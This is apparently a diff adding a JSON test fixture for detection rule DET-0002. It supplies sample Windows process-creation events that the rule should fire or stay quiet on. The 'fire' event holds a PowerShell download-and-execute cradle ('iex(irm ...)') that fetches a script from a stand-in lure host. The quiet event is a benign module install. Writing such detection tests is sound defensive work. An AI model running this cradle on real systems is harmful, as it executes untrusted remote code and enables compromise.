@@ -1,0 +1,21 @@
+{
+  "detection": "DET-0002",
+  "logsource": {
+    "category": "process_creation",
+    "product": "windows"
+  },
+  "events": [
+    {
+      "_expect": "fire",
+      "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "ParentImage": "C:\\Windows\\explorer.exe",
+      "CommandLine": "powershell -c \"iex(irm 'https://cdn.example-lure.test/v.ps1' -UseBasicParsing)\""
+    },
+    {
+      "_expect": "quiet",
+      "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "ParentImage": "C:\\Windows\\System32\\svchost.exe",
+      "CommandLine": "powershell -c \"Install-Module -Name Az -Scope CurrentUser\""
+    }
+  ]
+}
